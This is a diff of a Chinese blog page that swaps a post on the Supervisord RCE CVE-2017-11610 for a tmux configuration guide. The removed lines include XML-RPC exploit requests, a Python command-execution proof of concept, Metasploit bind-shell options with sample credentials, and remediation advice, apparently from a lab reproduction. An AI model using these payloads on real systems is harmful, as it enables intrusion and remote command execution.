@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Supervisord | Mr.Framework</title>
+  <title>Tmux | Mr.Framework</title>
   <meta name="keywords" content="">
-  <meta name="description" content="Supervisord | Mr.Framework">
+  <meta name="description" content="Tmux | Mr.Framework">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="404 Not Found: 该页面无法显示很抱歉，您所访问的地址并不存在">
 <meta property="og:type" content="website">
@@ -483,9 +483,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Supervisord" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Tmux" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Supervisord</h1>
+        <h1 class="article-title">Tmux</h1>
     
     <div class="article-meta">
         
@@ -495,9 +495,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Kali">Kali</a> > 
-            
-            <a  data-rel="Kali&lt;---&gt;Exploit">Exploit</a>
+            <a  data-rel="Tools">Tools</a>
             
         </span>
         
@@ -505,12 +503,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-12-04 20:23:08'>2020-12-04 20:23</time>
+            Created At : <time class="date" title='Updated At: 2020-12-07 18:14:43'>2020-12-07 18:14</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:917</span>
+        <span>Count:700</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -540,7 +538,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Supervisord%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-11610"><span class="toc-text">Supervisord远程命令执行漏洞-CVE-2017-11610</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BurpSuite%E5%A4%8D%E7%8E%B0"><span class="toc-text">BurpSuite复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">MSF反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Installation"><span class="toc-text">Installation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Key-Bindings"><span class="toc-text">Key-Bindings</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Session-Operation"><span class="toc-text">Session Operation:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Operation"><span class="toc-text">Windows Operation:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Panel-Operation"><span class="toc-text">Panel Operation:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Configuration"><span class="toc-text">Configuration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Configuring-the-status-line"><span class="toc-text">Configuring the status line</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-the-macOS-clipboard-from-within-tmux-sessions"><span class="toc-text">Accessing the macOS clipboard from within tmux sessions</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -556,139 +554,111 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Supervisord是由python开发的进程控制系统，用于管理后台服务的工具， 作用类似于Linux自带的Systemd程序。</p>
-<p>Supervisord采用Client/Server架构， Server跑在系统后台， Client是个命令，通过RPC协议，调用Server提供的API，执行任务。</p>
-<p><code>RPC协议</code>指Client通过RPC协议可以在Server执行某个函数并得到返回结果。</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">sudo nmap -sV -Pn -T4 -sSU -p 9001 -sC  192.168.79.207
-Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 19:10 CST
-Nmap scan report for 192.168.79.207
-Host is up (0.00011s latency).
-
-PORT     STATE  SERVICE       VERSION
-9001/tcp open   http          Medusa httpd 1.12 (Supervisor process manager)
-|_http-server-header: Medusa/1.12
-|_http-title: Supervisor Status
-9001/udp closed etlservicemgr
-
-Nmap done: 1 IP address (1 host up) scanned in 186.59 seconds</code></pre>
-<h2 id="Supervisord远程命令执行漏洞-CVE-2017-11610"><a href="#Supervisord远程命令执行漏洞-CVE-2017-11610" class="headerlink" title="Supervisord远程命令执行漏洞-CVE-2017-11610"></a>Supervisord远程命令执行漏洞-CVE-2017-11610</h2><p>Requirements：</p>
+        <p><img src="../images/85596a5a-9bbf-11e6-8aa1-7c8d9829c008.gif" alt="Screenshot"></p>
+<h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><pre><code>$ cd
+$ git clone https://github.com/gpakosz/.tmux.git
+$ ln -s -f .tmux/.tmux.conf
+$ cp .tmux/.tmux.conf.local .</code></pre>
+<h2 id="Key-Bindings"><a href="#Key-Bindings" class="headerlink" title="Key-Bindings"></a>Key-Bindings</h2><ul>
+<li><code>&lt;prefix&gt;</code> <kbd>Ctrl</kbd> + <kbd>a</kbd> or <kbd>Ctrl</kbd> + <kbd>b</kbd></li>
+<li><code>&lt;prefix&gt; c</code>  <kbd>Ctrl</kbd> + <kbd>a</kbd> + <kbd>c</kbd></li>
+<li><code>&lt;prefix&gt; C-c</code>  <kbd>Ctrl</kbd> + <kbd>a</kbd>  + <kbd>Ctrl</kbd> + <kbd>c</kbd></li>
+<li><code>&lt;prefix&gt; ?</code> manual </li>
+<li><code>&lt;prefix&gt; d</code> detached the current session</li>
+<li><code>&lt;ctrl&gt; +d</code> kill current session</li>
+<li><code>&lt;prefix&gt; d</code> close current panel</li>
+</ul>
+<p>This configuration uses the following bindings:</p>
 <ul>
-<li>Supervisord版本<code>Supervisord 3.0a1 &lt; 3.3.2</code></li>
-<li>RPC端口可被访问</li>
-<li>RPC无密码/弱口令</li>
+<li><code>&lt;prefix&gt; e</code> opens <code>~/.tmux.conf.local</code></li>
+<li><code>&lt;prefix&gt; r</code> reloads <code>~/.tmux.conf.local</code></li>
+<li><code>C-l</code> clears both the screen and the tmux history</li>
 </ul>
-<h3 id="BurpSuite复现"><a href="#BurpSuite复现" class="headerlink" title="BurpSuite复现"></a>BurpSuite复现</h3><p>直接执行任意命令：</p>
+<h3 id="Session-Operation"><a href="#Session-Operation" class="headerlink" title="Session Operation:"></a>Session Operation:</h3><ul>
+<li><code>&lt;prefix&gt; C-c</code> creates a new session</li>
+<li><code>&lt;prefix&gt; C-f</code> lets you switch to another session by name</li>
+<li><code>&lt;prefix&gt; $</code> rename session name</li>
+<li><code>&lt;prefix&gt; s</code> list sessions</li>
+</ul>
+<h3 id="Windows-Operation"><a href="#Windows-Operation" class="headerlink" title="Windows Operation:"></a>Windows Operation:</h3><ul>
+<li><code>&lt;prefix&gt; C-h</code> and <code>&lt;prefix&gt; C-l</code> let you navigate windows </li>
+<li><code>&lt;prefix&gt; c</code> create window</li>
+<li><code>&lt;prefix&gt; w</code> list windows </li>
+<li><code>&lt;prefix&gt; Tab</code> brings you to the last active window</li>
+<li><code>&lt;prefix&gt; 1,2,3</code> let you navigate to specific window</li>
+<li><code>&lt;prefix&gt; ,</code> rename current window</li>
+<li><code>&lt;prefix&gt; &amp;</code> close current window</li>
+<li><code>&lt;prefix&gt; f</code> find specific window by name</li>
+</ul>
+<h3 id="Panel-Operation"><a href="#Panel-Operation" class="headerlink" title="Panel Operation:"></a>Panel Operation:</h3><ul>
+<li><p><code>&lt;prefix&gt; /</code> splits the current pane vertically</p>
+</li>
+<li><p><code>&lt;prefix&gt; -</code> splits the current pane horizontally</p>
+</li>
+<li><p><code>&lt;prefix&gt; h</code>, <code>&lt;prefix&gt; j</code>, <code>&lt;prefix&gt; k</code> and <code>&lt;prefix&gt; l</code> let you navigate</p>
+</li>
+<li><p><code>&lt;prefix&gt; o</code> navigate panels</p>
+</li>
+<li><p><code>&lt;prefix&gt; H</code>, <code>&lt;prefix&gt; J</code>, <code>&lt;prefix&gt; K</code>, <code>&lt;prefix&gt; L</code> let you resize panes</p>
+</li>
+<li><p><code>&lt;prefix&gt; &lt;</code> and <code>&lt;prefix&gt; &gt;</code> let you swap panes</p>
+</li>
+<li><p><code>&lt;prefix&gt; +</code> maximizes the current pane to a new panel</p>
+</li>
+<li><p><code>&lt;prefix&gt; x</code> kill the current panel</p>
+</li>
+<li><p><code>&lt;prefix&gt; m</code> toggles mouse mode on or off</p>
+</li>
+<li><p><code>&lt;prefix&gt; &lt;space&gt; </code> 切换窗格布局</p>
+</li>
+<li><p><code>&lt;prefix&gt; Enter</code> enters copy-mode</p>
+</li>
+<li><p><code>&lt;prefix&gt; b</code> lists the paste-buffers</p>
+</li>
+<li><p><code>&lt;prefix&gt; p</code> pastes from the top paste-buffer</p>
+</li>
+<li><p><code>&lt;prefix&gt; P</code> lets you choose the paste-buffer to paste from</p>
+</li>
+</ul>
+<h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><hr>
+<p>file: <code>~/.tmux.conf.local</code><br>variables:</p>
+<pre><code>tmux_conf_theme_left_separator_main=&#39;\uE0B0&#39;
+tmux_conf_theme_left_separator_sub=&#39;\uE0B1&#39;
+tmux_conf_theme_right_separator_main=&#39;\uE0B2&#39;
+tmux_conf_theme_right_separator_sub=&#39;\uE0B3&#39;</code></pre>
+<h3 id="Configuring-the-status-line"><a href="#Configuring-the-status-line" class="headerlink" title="Configuring the status line"></a>Configuring the status line</h3><p>Edit the <code>~/.tmux.conf.local</code> file (<code>&lt;prefix&gt; e</code>) and adjust the<br><code>tmux_conf_theme_status_left</code> and <code>tmux_conf_theme_status_right</code> variables to<br>your own preferences.</p>
+<p>This configuration supports the following builtin variables:</p>
 <ul>
-<li>POC-1</li>
+<li><code>#&#123;battery_bar&#125;</code>: horizontal battery charge bar</li>
+<li><code>#&#123;battery_percentage&#125;</code>: battery percentage</li>
+<li><code>#&#123;battery_status&#125;</code>: is battery charging or discharging?</li>
+<li><code>#&#123;battery_vbar&#125;</code>: vertical battery charge bar</li>
+<li><code>#&#123;circled_session_name&#125;</code>: circled session number, up to 20</li>
+<li><code>#&#123;hostname&#125;</code>: SSH/Mosh aware hostname information</li>
+<li><code>#&#123;hostname_ssh&#125;</code>: SSH/Mosh aware hostname information, blank when not<br>connected to a remote server through SSH/Mosh</li>
+<li><code>#&#123;loadavg&#125;</code>: load average</li>
+<li><code>#&#123;pairing&#125;</code>: is session attached to more than one client?</li>
+<li><code>#&#123;prefix&#125;</code>: is prefix being depressed?</li>
+<li><code>#&#123;root&#125;</code>: is current user root?</li>
+<li><code>#&#123;synchronized&#125;</code>: are the panes synchronized?</li>
+<li><code>#&#123;uptime_y&#125;</code>: uptime years</li>
+<li><code>#&#123;uptime_d&#125;</code>: uptime days, modulo 365 when <code>#&#123;uptime_y&#125;</code> is used</li>
+<li><code>#&#123;uptime_h&#125;</code>: uptime hours</li>
+<li><code>#&#123;uptime_m&#125;</code>: uptime minutes</li>
+<li><code>#&#123;uptime_s&#125;</code>: uptime seconds</li>
+<li><code>#&#123;username&#125;</code>: SSH/Mosh aware username information</li>
+<li><code>#&#123;username_ssh&#125;</code>: SSH aware username information, blank when not connected<br>to a remote server through SSH/Mosh</li>
 </ul>
-<pre><code>POST /RPC2 HTTP/1.1
-Host: localhost
-Accept: */*
-Accept-Language: en
-User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
-Connection: close
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 213
-
-&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;methodCall&gt;
-&lt;methodName&gt;supervisor.supervisord.options.warnings.linecache.os.system&lt;/methodName&gt;
-&lt;params&gt;
-&lt;param&gt;
-&lt;string&gt;touch /tmp/success&lt;/string&gt;
-&lt;/param&gt;
-&lt;/params&gt;
-&lt;/methodCall&gt;</code></pre>
-<ul>
-<li>POC-2-慎用(会导致业务程序退出)</li>
-</ul>
-<pre><code class="zsh">POST http://192.168.0.15:9001/RPC2 HTTP/1.1
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
-Accept: text/xml
-Content-Type: text/xml
-Accept-Language: en-GB,en;q=0.5
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-Content-Length: 503
-Host: 192.168.0.15:9001
-&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;methodCall&gt;
-&lt;methodName&gt;supervisor.supervisord.options.execve&lt;/methodName&gt;
-&lt;params&gt;
-&lt;param&gt;
-&lt;string&gt;/usr/bin/python&lt;/string&gt;
-&lt;/param&gt;
-&lt;param&gt;
-&lt;array&gt;
-&lt;data&gt;
-&lt;value&gt;&lt;string&gt;python&lt;/string&gt;&lt;/value&gt;
-&lt;value&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/value&gt;
-&lt;value&gt;&lt;string&gt;import os; os.system(&quot;touch /tmp/blahh&quot;)&lt;/string&gt;&lt;/value&gt;
-&lt;/data&gt;
-&lt;/array&gt;
-&lt;/param&gt;
-&lt;param&gt;
-&lt;struct&gt;
-&lt;/struct&gt;
-&lt;/param&gt;
-&lt;/params&gt;
-&lt;/methodCall&gt;</code></pre>
-<p><img src="../images/aba9f4cfddbb42439570b401b495a71b.png" alt="aba9f4cfddbb42439570b401b495a71b"></p>
-<blockquote>
-<p>关于直接回显的POC</p>
-</blockquote>
-<p>@Ricter 在微博上提出的一个思路，甚是有效，就是将命令执行的结果写入log文件中，再调用Supervisord自带的readLog方法读取log文件，将结果读出来。</p>
-<p>写了个简单的POC： <a href="/Applications/Joplin.app/Contents/Resources/app.asar/poc.py" title="poc.py">poc.py</a>，直接贴出来吧：</p>
-<pre><code>#!/usr/bin/env python3
-import xmlrpc.client
-import sys
-
-
-target = sys.argv[1]
-command = sys.argv[2]
-with xmlrpc.client.ServerProxy(target) as proxy:
-    old = getattr(proxy, &#39;supervisor.readLog&#39;)(0,0)
-
-    logfile = getattr(proxy, &#39;supervisor.supervisord.options.logfile.strip&#39;)()
-    getattr(proxy, &#39;supervisor.supervisord.options.warnings.linecache.os.system&#39;)(&#39;&#123;&#125; | tee -a &#123;&#125;&#39;.format(command, logfile))
-    result = getattr(proxy, &#39;supervisor.readLog&#39;)(0,0)
-
-    print(result[len(old):])</code></pre>
-<p>使用Python3执行并获取结果：<code>./poc.py &quot;http://your-ip:9001/RPC2&quot; &quot;command&quot;</code>：</p>
-<p><img src="../images/132841c397814d4c8544f7c1e834ab89.png" alt="132841c397814d4c8544f7c1e834ab89"></p>
-<h3 id="MSF反弹shell"><a href="#MSF反弹shell" class="headerlink" title="MSF反弹shell"></a>MSF反弹shell</h3><blockquote>
-<p>需要知道用户密码：espc：what</p>
-</blockquote>
-<pre><code>Module options (exploit/linux/http/supervisor_xmlrpc_exec):
-
-   Name          Current Setting  Required  Description
-   ----          ---------------  --------  -----------
-   HttpPassword    what               no        Password for HTTP basic auth
-   HttpUsername    espc               no        Username for HTTP basic auth
-   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS        10.184.67.1      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
-   RPORT         8103             yes       The target port (TCP)
-   SRVHOST       0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-   SRVPORT       8080             yes       The local port to listen on.
-   SSL           false            no        Negotiate SSL/TLS for outgoing connections
-   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
-   TARGETURI     /RPC2            yes       The path to the XML-RPC endpoint
-   URIPATH                        no        The URI to use for this exploit (default is random)
-   VHOST                          no        HTTP server virtual host
-
-
-Payload options (generic/shell_bind_tcp):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LPORT  4444             yes       The listen port
-   RHOST  10.184.67.1      no        The target address</code></pre>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul>
-<li>升级Supervisord</li>
-<li>端口访问控制</li>
-<li>设置复杂RPC密码</li>
-</ul>
-<p>参考：<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html">Supervisord远程命令执行漏洞</a></p>
+<p>Beside custom variables mentioned above, the <code>tmux_conf_theme_status_left</code> and<br><code>tmux_conf_theme_status_right</code> variables support usual tmux syntax, e.g. using<br><code>#()</code> to call an external command that inserts weather information provided by<br><a target="_blank" rel="noopener" href="https://github.com/chubin/wttr.in#one-line-output">wttr.in</a>:</p>
+<pre><code>tmux_conf_theme_status_right=&#39;#&#123;prefix&#125;#&#123;pairing&#125;#&#123;synchronized&#125; #(curl wttr.in?format=3) , %R , %d %b | #&#123;username&#125;#&#123;root&#125; | #&#123;hostname&#125; &#39;</code></pre>
+<p><img src="../images/52175490-07797c00-27a5-11e9-9fb6-42eec4fe4188.png" alt="Weather information from wttr.in"></p>
+<h3 id="Accessing-the-macOS-clipboard-from-within-tmux-sessions"><a href="#Accessing-the-macOS-clipboard-from-within-tmux-sessions" class="headerlink" title="Accessing the macOS clipboard from within tmux sessions"></a>Accessing the macOS clipboard from within tmux sessions</h3><p>[Chris Johnsen created the <code>reattach-to-user-namespace</code><br>utility][reattach-to-user-namespace] that makes <code>pbcopy</code> and <code>pbpaste</code> work<br>again within tmux.</p>
+<p>To install <code>reattach-to-user-namespace</code>, use either <a target="_blank" rel="noopener" href="http://www.macports.org/">MacPorts</a> or<br><a target="_blank" rel="noopener" href="http://brew.sh/">Homebrew</a>:</p>
+<p>   <code> $ port install tmux-pasteboard</code></p>
+<p>or</p>
+<pre><code>`$ brew install reattach-to-user-namespace`</code></pre>
+<p>Once installed, <code>reattach-to-usernamespace</code> will be automatically detected.</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kevingrace/p/6496899.html">tmux终端复用神器</a></p>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 askding@qq.com </span>
